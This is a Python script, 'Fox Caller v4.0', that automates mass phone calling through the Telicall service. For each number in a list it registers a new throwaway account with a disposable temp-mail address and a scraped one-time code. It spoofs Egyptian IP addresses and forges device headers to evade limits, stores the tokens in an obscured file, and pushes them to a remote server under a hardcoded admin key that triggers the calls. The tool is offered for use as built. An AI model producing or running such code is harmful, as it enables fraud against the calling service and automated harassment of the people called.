#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Fox Caller v4.0 - Server-Side Call Launcher
=============================================
- Reads phone numbers from .xlsx or text file
- Creates Telicall account for EACH number (1 account = 1 call = 64s)
- Uploads token to server + triggers server-side async call
- Does NOT wait 64 seconds — fires and moves to next number immediately
- Shows real-time progress: [W1] RING +966510122129 <- email@domain

Usage:
  python3 fox_caller1.py numbers.xlsx
  python3 fox_caller1.py numbers.xlsx --duration 64 --threads 5
  python3 fox_caller1.py numbers.txt   (one number per line)
"""

import requests
import json
import uuid
import time
import random
import re
import os
import hashlib
import base64
import threading
import argparse
import sys
from datetime import datetime
from filelock import FileLock

# ═══════════════════════════════════════════════════════
# ─── Config ───────────────────────────────────────────
# ═══════════════════════════════════════════════════════
API_URL       = "https://api.telicall.com"
SERVER_URL    = "https://callapp-production-c84c.up.railway.app"
ADMIN_KEY     = "06d271200e53fb4482acd8679bfe358a"
DAN_FILE      = os.path.join(os.path.dirname(os.path.abspath(__file__)), "Dan.json")
PASSWORD      = "@@@GMAQ@@@"
DEFAULT_DURATION = 64   # seconds per call
DEFAULT_THREADS   = 5

# Email domains that work with Telicall (hitzcart.com confirmed working)
ACCEPTED_DOMAINS = ["hitzcart.com", "googxs.co", "doreact.co", "ifcoat.co",
                    "matkind.co", "googlemail.com"]

# ═══════════════════════════════════════════════════════
# ─── Egyptian IP Rotation ────────────────────────────
# ═══════════════════════════════════════════════════════
_EG_RANGES = [
    (41, 32), (41, 33), (41, 34), (41, 35), (41, 36),
    (41, 37), (41, 38), (41, 39), (41, 40), (41, 41),
    (41, 42), (41, 43), (41, 44), (41, 45), (41, 46),
    (41, 47), (41, 48), (41, 49), (41, 50), (41, 51),
    (41, 52), (41, 53), (41, 54), (41, 55), (41, 56),
    (41, 57), (41, 58), (41, 59), (41, 60), (41, 61),
    (156, 192), (156, 193), (156, 194), (156, 195),
    (156, 196), (156, 197), (156, 198), (156, 199),
    (156, 200), (156, 201), (156, 202), (156, 203),
    (197, 32), (197, 33), (197, 34), (197, 35),
    (197, 36), (197, 37), (197, 38), (197, 39),
    (197, 40), (197, 41), (197, 42), (197, 43),
]

_ip_lock  = threading.Lock()
_used_ips = set()

def rand_eg_ip():
    with _ip_lock:
        for _ in range(50):
            a, b = random.choice(_EG_RANGES)
            c = random.randint(1, 254)
            d = random.randint(1, 254)
            ip = f"{a}.{b}.{c}.{d}"
            if ip not in _used_ips:
                _used_ips.add(ip)
                return ip
        _used_ips.clear()
        a, b = random.choice(_EG_RANGES)
        c = random.randint(1, 254)
        d = random.randint(1, 254)
        return f"{a}.{b}.{c}.{d}"

# ═══════════════════════════════════════════════════════
# ─── web2.temp-mail.org ──────────────────────────────
# ═══════════════════════════════════════════════════════
WEB2_BASE_URL = "https://web2.temp-mail.org"
WEB2_HEADERS = {
    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
    'Accept': 'application/json, text/plain, */*',
    'Origin': 'https://temp-mail.org',
    'Referer': 'https://temp-mail.org/',
    'Content-Type': 'application/json'
}

def create_email():
    """Create temp email - accepts any working domain"""
    for _ in range(30):
        try:
            r = requests.post(f"{WEB2_BASE_URL}/mailbox", headers=WEB2_HEADERS, timeout=15)
            if r.status_code in [200, 201]:
                data = r.json()
                email = data.get('mailbox', '')
                token = data.get('token', '')
                if email and token:
                    domain = email.split('@')[1] if '@' in email else ''
                    if domain in ACCEPTED_DOMAINS:
                        return {'email': email, 'token': token, 'api_type': 'web2'}
                    # Domain not accepted - retry
            elif r.status_code == 429:
                time.sleep(2)
            else:
                time.sleep(1)
        except Exception:
            time.sleep(2)
    return None

def check_web2_inbox(email_token):
    try:
        headers = WEB2_HEADERS.copy()
        headers['Authorization'] = f'Bearer {email_token}'
        r = requests.get(f'{WEB2_BASE_URL}/messages', headers=headers, timeout=15)
        if r.status_code == 200:
            data = r.json()
            return data if isinstance(data, list) else data.get('messages', [])
    except:
        pass
    return []

def get_otp(email_token):
    deadline = time.time() + 90
    while time.time() < deadline:
        try:
            messages = check_web2_inbox(email_token)
            for msg in messages:
                sender  = msg.get('from', '').lower()
                subject = msg.get('subject', '').lower()
                body    = msg.get('bodyPreview', msg.get('body', msg.get('textBody', msg.get('bodyHtml', ''))))
                content = f"{sender} {subject} {body}".lower()
                if 'teli' in content or 'verification' in subject or 'verify' in subject:
                    m = re.search(r'\b(\d{6})\b', str(body))
                    if m:
                        return m.group(1)
        except:
            pass
        time.sleep(3)
    return None

# ═══════════════════════════════════════════════════════
# ─── Telicall API ────────────────────────────────────
# ═══════════════════════════════════════════════════════
def init_session():
    ip = rand_eg_ip()
    device = ''.join(random.choices('0123456789abcdef', k=16))
    h = {
        "host": "api.telicall.com",
        "x-request-id": str(uuid.uuid4()),
        "user-agent": "Dalvik/2.1.0",
        "x-app-version": "1.2.1",
        "x-client-device-id": device,
        "x-lang": "en", "x-os": "android", "x-os-version": "11",
        "x-req-timestamp": str(int(time.time() * 1000)),
        "x-req-signature": "-1",
        "content-type": "application/json",
        "x-token": "",
        "x-currency": "EGP",
        "x-real-ip": ip,
    }
    body = {
        "countryCode": "eg", "deviceName": "Infinix X698",
        "notificationToken": "", "oldToken": "",
        "peerKey": str(random.randint(100, 999)),
        "timeZone": "Africa/Cairo", "localizationKey": ""
    }
    try:
        h["x-request-id"]    = str(uuid.uuid4())
        h["x-req-timestamp"] = str(int(time.time() * 1000))
        r = requests.post(f"{API_URL}/init", json=body, headers=h, timeout=10)
        if r.status_code == 200:
            tok = r.json().get('result', {}).get('token')
            if tok:
                h["x-token"] = tok
                return tok, device, h
    except Exception:
        pass
    return None, None, None

def send_verify(email, headers):
    try:
        headers["x-request-id"]    = str(uuid.uuid4())
        headers["x-req-timestamp"] = str(int(time.time() * 1000))
        r = requests.post(f"{API_URL}/auth/send-email", json={'email': email},
                          headers=headers, timeout=10)
        if r.status_code == 200:
            return r.json().get('result', {}).get('reference')
    except Exception:
        pass
    return None

def verify_otp_api(ref, code, headers):
    try:
        headers["x-request-id"]    = str(uuid.uuid4())
        headers["x-req-timestamp"] = str(int(time.time() * 1000))
        r = requests.post(f"{API_URL}/auth/verify-identity",
                          json={'reference': ref, 'code': str(code)},
                          headers=headers, timeout=10)
        if r.status_code == 200:
            return r.json().get('result', {}).get('user')
    except Exception:
        pass
    return None

# ═══════════════════════════════════════════════════════
# ─── Dan.json Encryption ─────────────────────────────
# ═══════════════════════════════════════════════════════
def _make_key(password: str) -> bytes:
    return hashlib.sha256(password.encode()).digest()

def encrypt_text(plain: str, password: str) -> bytes:
    key  = _make_key(password)
    data = plain.encode('utf-8')
    enc  = bytes([data[i] ^ key[i % len(key)] for i in range(len(data))])
    return base64.b64encode(enc)

def decrypt_file(path: str, password: str) -> str:
    with open(path, 'rb') as f:
        raw = base64.b64decode(f.read())
    key = _make_key(password)
    return bytes([raw[i] ^ key[i % len(key)] for i in range(len(raw))]).decode('utf-8')

def save_account(email, device, tok):
    lock_path = DAN_FILE + ".lock"
    lock = FileLock(lock_path, timeout=10)
    with lock:
        current = []
        if os.path.exists(DAN_FILE):
            try:
                current = json.loads(decrypt_file(DAN_FILE, PASSWORD))
            except:
                try:
                    current = json.loads(open(DAN_FILE, 'rb').read().decode('utf-8'))
                except:
                    current = []
        current.append({
            "email": email,
            "x-client-device-id": device,
            "x-token": tok,
            "created": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        })
        total = len(current)
        encrypted = encrypt_text(json.dumps(current, indent=2, ensure_ascii=False), PASSWORD)
        with open(DAN_FILE, 'wb') as f:
            f.write(encrypted)
        return total

# ═══════════════════════════════════════════════════════
# ─── Server API ──────────────────────────────────────
# ═══════════════════════════════════════════════════════
def upload_to_server(email, device_id, token):
    """Upload account token to server"""
    try:
        r = requests.post(f"{SERVER_URL}/api/fox-caller/upload-accounts",
                          headers={"Content-Type": "application/json",
                                   "x-admin-key": ADMIN_KEY},
                          json={"accounts": [{"email": email,
                                              "x-client-device-id": device_id,
                                              "x-token": token}]},
                          timeout=15)
        if r.status_code == 200:
            data = r.json()
            return data.get("ready_tokens", 0)
    except Exception:
        pass
    return 0

def trigger_server_call(phone, duration=64):
    """Trigger async call on server (fire and forget)"""
    try:
        r = requests.post(f"{SERVER_URL}/api/fox-caller/async-call",
                          headers={"Content-Type": "application/json",
                                   "x-admin-key": ADMIN_KEY},
                          json={"phone": phone, "duration": duration},
                          timeout=15)
        if r.status_code == 200:
            data = r.json()
            return data.get("call_id"), data.get("verification_url", "")
        else:
            # Fallback: try the blocking make-call endpoint
            try:
                r2 = requests.post(f"{SERVER_URL}/api/fox-caller/make-call",
                                   headers={"Content-Type": "application/json",
                                            "x-admin-key": ADMIN_KEY},
                                   json={"phone": phone, "duration": duration},
                                   timeout=15)
                if r2.status_code == 200:
                    data = r2.json()
                    return "sync-" + secrets_token_hex(4), ""
            except:
                pass
    except Exception:
        pass
    return None, ""

def secrets_token_hex(n):
    import secrets as _s
    return _s.token_hex(n)

def check_call_status(call_id):
    """Check call status on server"""
    try:
        r = requests.get(f"{SERVER_URL}/api/fox-caller/call-status/{call_id}",
                         timeout=10)
        if r.status_code == 200:
            return r.json()
    except:
        pass
    return None

# ═══════════════════════════════════════════════════════
# ─── Read Numbers from File ─────────────────────────
# ═══════════════════════════════════════════════════════
def read_numbers(filepath):
    """Read phone numbers from .xlsx or .txt file"""
    numbers = []

    if filepath.endswith('.xlsx'):
        try:
            import openpyxl
            wb = openpyxl.load_workbook(filepath, read_only=True)
            ws = wb.active
            for row in ws.iter_rows(values_only=True):
                for cell in row:
                    if cell is not None:
                        num = str(cell).strip()
                        # Normalize phone number
                        num = num.replace(' ', '').replace('-', '').replace('(', '').replace(')', '')
                        if num.startswith('00'):
                            num = '+' + num[2:]
                        elif num.startswith('0') and not num.startswith('+'):
                            # Assume local number - add +2 for Egypt or keep as is
                            pass
                        if num.startswith('+') and len(num) >= 10:
                            numbers.append(num)
                        elif len(num) >= 10 and num.isdigit():
                            numbers.append('+' + num)
            wb.close()
        except ImportError:
            print("ERROR: openpyxl not installed. Run: pip3 install openpyxl", flush=True)
            sys.exit(1)
    else:
        # Text file - one number per line
        try:
            with open(filepath, 'r') as f:
                for line in f:
                    num = line.strip().replace(' ', '').replace('-', '')
                    if num.startswith('00'):
                        num = '+' + num[2:]
                    if num.startswith('+') and len(num) >= 10:
                        numbers.append(num)
                    elif len(num) >= 10 and num.isdigit():
                        numbers.append('+' + num)
        except Exception as e:
            print(f"ERROR reading file: {e}", flush=True)
            sys.exit(1)

    # Remove duplicates while preserving order
    seen = set()
    unique = []
    for n in numbers:
        if n not in seen:
            seen.add(n)
            unique.append(n)

    return unique

# ═══════════════════════════════════════════════════════
# ─── Stats ───────────────────────────────────────────
# ═══════════════════════════════════════════════════════
_stats_lock = threading.Lock()
_stats = {
    "answered": 0,
    "no_answer": 0,
    "busy": 0,
    "failed": 0,
    "no_balance": 0,
    "not_found": 0,
    "active": 0,
    "total": 0,
}
_start_time = None
_stop_flag  = threading.Event()

# Phone queue - threads pick numbers from here
_phone_queue = []
_queue_lock  = threading.Lock()
_queue_index = 0

def get_next_phone():
    """Get next phone number from queue (thread-safe)"""
    global _queue_index
    with _queue_lock:
        if _queue_index < len(_phone_queue):
            phone = _phone_queue[_queue_index]
            _queue_index += 1
            return phone
    return None

def format_stats():
    elapsed = time.time() - _start_time if _start_time else 0
    mins = int(elapsed) // 60
    secs = int(elapsed) % 60
    with _stats_lock:
        s = _stats
        return (f"Stats [{mins}m{secs}s] "
                f"{s['answered']} Ans | {s['no_answer']} NoA | "
                f"{s['busy']} Bsy | {s['failed']} Fail | "
                f"{s['not_found']} NF | {s['active']} Active | "
                f"{s['total']} Total")

def update_stat(key, delta=1):
    with _stats_lock:
        _stats[key] += delta

# ═══════════════════════════════════════════════════════
# ─── Worker: Create Account + Call ───────────────────
# ═══════════════════════════════════════════════════════
def create_and_call(duration):
    """
    Worker function:
    1. Pick next phone number from queue
    2. Create a new Telicall account
    3. Upload token to server
    4. Trigger server-side async call (fire and forget)
    5. Move to next number
    """
    tid = threading.current_thread().name

    while not _stop_flag.is_set():
        phone = get_next_phone()
        if not phone:
            break

        update_stat("total")
        update_stat("active")
        email_short = "..."
        call_id = None

        try:
            # ── Step 1: Create email ──
            mail = create_email()
            if not mail:
                print(f"[{tid}] NO_EMAIL {phone}", flush=True)
                update_stat("failed")
                update_stat("active", -1)
                continue

            email_addr = mail['email']
            email_short = email_addr[:20]

            # ── Step 2: Init Telicall session ──
            tok, device, headers = init_session()
            if not tok:
                print(f"[{tid}] INIT_FAIL {phone} <- {email_short}", flush=True)
                update_stat("failed")
                update_stat("active", -1)
                continue

            # ── Step 3: Send verification ──
            ref = send_verify(email_addr, headers)
            if not ref:
                print(f"[{tid}] VERIFY_FAIL {phone} <- {email_short}", flush=True)
                update_stat("failed")
                update_stat("active", -1)
                continue

            # ── Step 4: Get OTP ──
            otp = get_otp(mail['token'])
            if not otp:
                print(f"[{tid}] OTP_TIMEOUT {phone} <- {email_short}", flush=True)
                update_stat("failed")
                update_stat("active", -1)
                continue

            # ── Step 5: Verify OTP ──
            user = verify_otp_api(ref, otp, headers)
            if not user:
                print(f"[{tid}] VERIFY_FAIL {phone} <- {email_short}", flush=True)
                update_stat("failed")
                update_stat("active", -1)
                continue

            # ── Step 6: Save to Dan.json ──
            save_account(email_addr, device, tok)

            # ── Step 7: Upload token to server ──
            ready = upload_to_server(email_addr, device, tok)

            # ── Step 8: Trigger server-side async call ──
            call_id, verify_url = trigger_server_call(phone, duration)

            if call_id:
                print(f"[{tid}] RING {phone} <- {email_short}", flush=True)
                # The server is now ringing — we don't wait for 64s!
                # We move to the next number immediately
            else:
                # Server call failed — try direct call as fallback
                print(f"[{tid}] SERVER_FAIL {phone} <- {email_short}", flush=True)
                update_stat("failed")
                update_stat("active", -1)
                continue

        except Exception as e:
            print(f"[{tid}] ERROR {phone}: {e}", flush=True)
            update_stat("failed")
            update_stat("active", -1)
            continue

        update_stat("active", -1)

# ═══════════════════════════════════════════════════════
# ─── Background: Monitor active calls ────────────────
# ═══════════════════════════════════════════════════════
_active_call_ids = []
_active_call_lock = threading.Lock()

def add_active_call(call_id, phone, email_short, tid):
    with _active_call_lock:
        _active_call_ids.append({
            "call_id": call_id,
            "phone": phone,
            "email": email_short,
            "tid": tid,
            "started": time.time()
        })

def monitor_calls():
    """Background thread that checks call statuses and prints updates"""
    while not _stop_flag.is_set():
        time.sleep(10)  # Check every 10 seconds
        with _active_call_lock:
            remaining = []
            for c in _active_call_ids:
                status = check_call_status(c["call_id"])
                if status:
                    s = status.get("status", "")
                    dur = status.get("actual_duration", 0)
                    verified = status.get("verified", False)
                    phone = c["phone"]
                    email = c["email"]
                    tid = c["tid"]

                    if s == "answered_ok":
                        if verified:
                            print(f"[{tid}] ANSWERED_OK {phone} ({dur}s) <- {email}", flush=True)
                            update_stat("answered")
                        else:
                            print(f"[{tid}] ANSWERED_SHORT {phone} ({dur}s) <- {email}", flush=True)
                            update_stat("no_answer")
                    elif s in ("failed", "error"):
                        err = status.get("error", "")
                        print(f"[{tid}] CALL_FAILED {phone} <- {email} ({err})", flush=True)
                        update_stat("failed")
                    elif s == "ringing" or s == "calling":
                        # Still in progress - keep monitoring
                        remaining.append(c)
                    else:
                        remaining.append(c)
                else:
                    # Couldn't check status - keep in list
                    elapsed = time.time() - c["started"]
                    if elapsed > 300:  # 5 min timeout
                        print(f"[{tid}] TIMEOUT {c['phone']} <- {c['email']}", flush=True)
                        update_stat("failed")
                    else:
                        remaining.append(c)
            _active_call_ids.clear()
            _active_call_ids.extend(remaining)

# ═══════════════════════════════════════════════════════
# ─── Main ───────────────────────────────────────────
# ═══════════════════════════════════════════════════════
def main():
    global _start_time, _phone_queue

    parser = argparse.ArgumentParser(description="Fox Caller v4.0 - Server-Side Call Launcher")
    parser.add_argument("file", help="Phone numbers file (.xlsx or .txt)")
    parser.add_argument("--duration", type=int, default=DEFAULT_DURATION,
                        help=f"Call duration in seconds (default: {DEFAULT_DURATION})")
    parser.add_argument("--threads", type=int, default=DEFAULT_THREADS,
                        help=f"Number of worker threads (default: {DEFAULT_THREADS})")
    args = parser.parse_args()

    # Read numbers
    if not os.path.exists(args.file):
        print(f"ERROR: File not found: {args.file}", flush=True)
        sys.exit(1)

    numbers = read_numbers(args.file)
    if not numbers:
        print("ERROR: No valid phone numbers found in file", flush=True)
        sys.exit(1)

    _phone_queue = numbers

    print("=" * 60, flush=True)
    print("  Fox Caller v4.0 - Server-Side Call Launcher", flush=True)
    print("=" * 60, flush=True)
    print(f"  Server:     {SERVER_URL}", flush=True)
    print(f"  Numbers:    {len(numbers)} phones from {args.file}", flush=True)
    print(f"  Duration:   {args.duration}s per call", flush=True)
    print(f"  Threads:    {args.threads}", flush=True)
    print(f"  Strategy:   1 account = 1 call (no reuse)", flush=True)
    print(f"  Mode:       Fire & forget (server handles call)", flush=True)
    print("=" * 60, flush=True)

    # Quick server test
    print("\nTesting server connection...", flush=True)
    try:
        r = requests.get(f"{SERVER_URL}/api/health", timeout=10)
        if r.status_code == 200:
            print(f"  Server OK: {r.json()}", flush=True)
        else:
            print(f"  Server returned {r.status_code}", flush=True)
    except Exception as e:
        print(f"  Server error: {e}", flush=True)
        print("  WARNING: Server may not be available!", flush=True)

    # Check ready tokens
    try:
        r = requests.get(f"{SERVER_URL}/api/admin/stats",
                         headers={"x-admin-key": ADMIN_KEY}, timeout=10)
        if r.status_code == 200:
            data = r.json()
            print(f"  Ready tokens: {data.get('ready_tokens', '?')}", flush=True)
            print(f"  Total users:  {data.get('total_users', '?')}", flush=True)
    except:
        pass

    print(f"\nStarting {args.threads} workers...", flush=True)
    print(f"Format: [W#] STATUS +PHONE <- EMAIL", flush=True)
    print(f"Status: RING | ANSWERED_OK | NO_BALANCE | FAILED\n", flush=True)

    _start_time = time.time()

    # Start monitor thread
    monitor_thread = threading.Thread(target=monitor_calls, daemon=True)
    monitor_thread.start()

    # Start worker threads
    threads = []
    for i in range(args.threads):
        t = threading.Thread(target=create_and_call, args=(args.duration,),
                             daemon=True, name=f"W{i}")
        t.start()
        threads.append(t)

    # Wait for all workers to finish
    for t in threads:
        t.join()

    # Wait a bit for any remaining calls to complete
    print(f"\nAll numbers processed. Waiting for remaining calls...", flush=True)
    time.sleep(10)

    # Final stats
    elapsed = time.time() - _start_time
    mins = int(elapsed) // 60
    secs = int(elapsed) % 60
    with _stats_lock:
        s = _stats
    print(f"\n{'=' * 60}", flush=True)
    print(f"  FINAL RESULTS [{mins}m{secs}s]", flush=True)
    print(f"{'=' * 60}", flush=True)
    print(f"  Total numbers:  {len(numbers)}", flush=True)
    print(f"  Answered OK:    {s['answered']}", flush=True)
    print(f"  No Answer:      {s['no_answer']}", flush=True)
    print(f"  Busy/Declined:  {s['busy']}", flush=True)
    print(f"  Failed:         {s['failed']}", flush=True)
    print(f"  No Balance:     {s['no_balance']}", flush=True)
    print(f"  Not Found:      {s['not_found']}", flush=True)
    print(f"{'=' * 60}", flush=True)

if __name__ == "__main__":
    main()
